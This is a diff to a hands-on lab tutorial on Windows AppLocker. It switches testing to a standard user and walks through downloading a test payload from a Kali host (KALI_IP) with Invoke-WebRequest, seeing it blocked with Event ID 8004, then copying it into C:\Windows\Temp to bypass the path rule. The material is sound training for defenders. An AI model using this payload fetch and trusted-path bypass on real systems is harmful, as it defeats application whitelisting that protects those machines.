@@ -278,6 +278,17 @@ This time you will see actual rules in the output. Find the line `EnforcementMod
 
 Reading about AppLocker is one thing. Watching it block something real is how it actually clicks.
 
+> [!IMPORTANT]
+> **Switch to the Standard User Account Now**
+> 
+> You did the AppLocker setup as **Administrator**. However, one of the default AppLocker rules is: *"Allow members of the local Administrators group to run all applications."*
+> 
+> If you test the payload as Administrator, it will run immediately without being blocked. To test AppLocker properly, you must simulate a standard employee:
+> 1. Log out of the **Administrator** account on your Windows VM.
+> 2. Log in as the standard **User** account you created in `01-lab-setup.md`.
+> 
+> Everything in this testing section must be done while logged in as the standard **User**.
+
 You are going to generate a test executable on Kali, transfer it to your Windows VM, and attempt to run it. AppLocker will block it. Then you will run it from a location that AppLocker trusts - and it will run. That gap is the foundation of every bypass in the files that follow.
 
 ### On Your Kali VM
@@ -298,22 +309,24 @@ python3 -m http.server 8000
 
 Leave this running. Your Kali machine is now hosting the file on port 8000.
 
-### On Your Windows 11 VM
+### On Your Windows 11 VM (Logged in as "User")
 
-Open PowerShell and download the file. Replace `KALI_IP` with your Kali machine's IP address (the one you noted during lab setup):
+A standard user does not have permission to write files directly to the root of the `C:\` drive. Therefore, you must download the payload to a directory you own, such as your `Downloads` folder.
+
+Open **PowerShell** (do NOT run it as Administrator) and download the file. Replace `KALI_IP` with your Kali machine's IP address:
 
 ```powershell
-Invoke-WebRequest -Uri "http://KALI_IP:8000/test_payload.exe" -OutFile "C:\test_payload.exe"
+Invoke-WebRequest -Uri "http://KALI_IP:8000/test_payload.exe" -OutFile "C:\Users\User\Downloads\test_payload.exe"
 ```
 
 Confirm the download:
 
 ```powershell
-Get-Item C:\test_payload.exe
+Get-Item C:\Users\User\Downloads\test_payload.exe
 ```
 
 ```
-    Directory: C:\
+    Directory: C:\Users\User\Downloads
 
 Mode                 LastWriteTime         Length Name
 ----                 -------------         ------  ----
@@ -323,13 +336,13 @@ Mode                 LastWriteTime         Length Name
 Now attempt to run it:
 
 ```powershell
-C:\test_payload.exe
+C:\Users\User\Downloads\test_payload.exe
 ```
 
 What you will see:
 
 ```
-C:\test_payload.exe : This program is blocked by group policy.
+C:\Users\User\Downloads\test_payload.exe : This program is blocked by group policy.
 For more information, contact your system administrator.
     + CategoryInfo          : NotSpecified: (:) [], Win32Exception
     + FullyQualifiedErrorId : System.ComponentModel.Win32Exception
@@ -360,8 +373,8 @@ Applications and Services Logs
 You will see an event. Double-click it. The details will show:
 
 - **Event ID 8004** - the file was blocked
-- The full path of the blocked file (`C:\test_payload.exe`)
-- The user who attempted to run it
+- The full path of the blocked file (`C:\Users\User\Downloads\test_payload.exe`)
+- The user who attempted to run it (`User`)
 - The policy that caused the block (no matching allow rule)
 
 This is exactly what a defender sees when AppLocker blocks a real attack. The event tells you what was attempted, by whom, and when.
@@ -370,10 +383,10 @@ This is exactly what a defender sees when AppLocker blocks a real attack. The ev
 
 ## Finding the Gap: Running From a Trusted Path
 
-AppLocker blocked the executable from `C:\`. Now copy it to a location inside the trusted `C:\Windows\` path:
+AppLocker blocked the executable from `C:\Users\User\Downloads\`. Now copy it to a location inside the trusted `C:\Windows\` path:
 
 ```powershell
-Copy-Item C:\test_payload.exe C:\Windows\Temp\test_payload.exe
+Copy-Item C:\Users\User\Downloads\test_payload.exe C:\Windows\Temp\test_payload.exe
 ```
 
 Run it from there:
